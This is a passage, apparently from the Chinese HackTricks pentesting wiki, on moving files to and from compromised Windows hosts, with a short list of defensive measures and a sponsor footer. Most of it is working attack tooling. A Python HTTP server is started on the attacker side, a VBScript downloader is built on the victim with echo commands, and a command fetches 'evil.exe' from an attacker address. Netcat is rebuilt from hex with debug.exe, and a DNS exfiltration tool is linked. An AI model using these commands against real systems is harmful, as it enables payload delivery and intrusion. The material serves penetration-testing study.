strValue = objShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SomeValue")
```

#### 4. 输出到日志文件

VBScript可以将数据输出到日志文件中。可以使用`FileSystemObject`对象的`OpenTextFile`方法来创建或打开日志文件，并使用`WriteLine`方法将数据写入文件。

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\log.txt", 8, True)
objFile.WriteLine "Data to be logged"
objFile.Close
```

### 防御措施

为了防止VBScript的数据泄露，可以采取以下措施：

- 限制VBScript的执行权限，只允许受信任的脚本运行。
- 定期审查系统中的VBScript脚本，确保没有包含敏感信息的代码。
- 使用防火墙和入侵检测系统来监控和阻止异常的网络请求。
- 限制对注册表的访问权限，只允许受信任的脚本读取注册表项。
- 定期检查系统日志文件，以发现异常的数据输出行为。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**受害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

这是一种适用于 Windows 32 位机器的疯狂技术。思路是使用 `debug.exe` 程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重新构建它们。所以我们的想法是，我们拿到二进制文件，比如 `netcat`。然后将其反汇编为十六进制，在受损的机器上将其粘贴到一个文件中，然后使用 `debug.exe` 进行汇编。

`Debug.exe` 只能汇编 64 kb。所以我们需要使用小于该大小的文件。我们可以使用 upx 进一步压缩它。所以让我们这样做：
```
upx -9 nc.exe
```
现在它只有29 kb。完美。现在让我们对其进行反汇编：
```
wine exe2bat.exe nc.exe nc.txt
```
现在我们只需将文本复制粘贴到我们的Windows shell中。它将自动创建一个名为nc.exe的文件。

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级Bug赏金平台！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
